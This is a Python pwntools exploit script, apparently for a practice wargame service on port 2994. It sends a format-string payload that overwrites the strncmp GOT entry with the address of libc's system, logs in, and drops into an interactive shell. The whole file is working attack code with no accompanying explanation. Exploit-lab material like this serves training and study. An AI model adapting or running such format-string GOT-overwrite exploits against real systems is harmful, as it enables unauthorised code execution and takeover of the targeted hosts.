#!/usr/bin/env python

import socket
from pwn import *

systemAddr = 0xb7ecffb0             # System in LIBC
strncmpPLTAddr = 0x804a1a8          # Got entry of strncmp
                                    # (gdb) info functions strncmp
                                    # take pointer behind "jmp *address"

def conn(ipAddr):
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ipAddr, 2994))
    ip, port = sock.getsockname()
    host = ip+":"+str(port)
    s = remote.fromsocket(sock)
    padding = "A"*(24-len(host))
    uPayload = "username "
    uPayload += padding+ p32(strncmpPLTAddr) + p32(strncmpPLTAddr+2) + '%47036x' +'%18$hn'+ '%17$18372x' + '%17$hn'
    pPayload = "login iloveyou"
    print(s.recvuntil("$ "))
    raw_input("press Enter")
    s.send(uPayload + "\n")
    print(s.recvuntil("$ "))
    s.send(pPayload + "\n")
    s.interactive()

if len(sys.argv) < 2:
    print("usage: %s <ipAddr>")

else:
    conn(sys.argv[1])
